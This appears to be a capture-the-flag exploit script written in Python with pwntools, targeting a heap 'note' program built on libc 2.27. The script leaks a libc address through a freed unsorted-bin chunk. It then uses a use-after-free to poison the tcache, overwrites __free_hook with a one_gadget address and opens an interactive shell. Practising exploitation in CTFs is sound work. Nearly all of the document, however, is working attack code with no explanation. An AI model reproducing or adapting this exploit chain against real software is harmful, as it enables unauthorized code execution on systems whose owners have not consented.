from pwn import *
from LibcSearcher import LibcSearcher
libc = ELF("./libc-2.27.so")
context.log_level="debug"

#p = remote("159.75.104.107",30369)
p = process("./note")

def dbg():
    gdb.attach(p)
    pause()

def choice(num):
    p.sendlineafter("5.exit",str(num))

def new(size):
    choice(1)
    p.sendlineafter("how long do you like to write?",str(size))

def delete(id):
    choice(2)
    p.sendlineafter("which note do you like to delete?",str(id))

def edit(id,text):
    choice(3)
    p.sendlineafter("which note do you like to edit?\n",str(id))
    p.sendline(text)

def show(id):
    choice(4)
    p.sendlineafter("which note do you like to show?",str(id))

gadget = [0x4f3d5,0x4f432,0x10a41c]

new(0x420)
new(0x20)

delete(0)
show(0)

p.recv(1)
__malloc_hook = u64(p.recv(6).ljust(8,"\x00")) - 0x70
print hex(__malloc_hook)

libc_base = __malloc_hook - libc.sym["__malloc_hook"]
free_hook = libc_base+libc.symbols['__free_hook']
one_gadget = gadget[1] + libc_base

delete(1)
edit(1,p64(free_hook))

new(0x20)
new(0x20)

edit(3,p64(one_gadget))
delete(1)

dbg()

p.interactive()
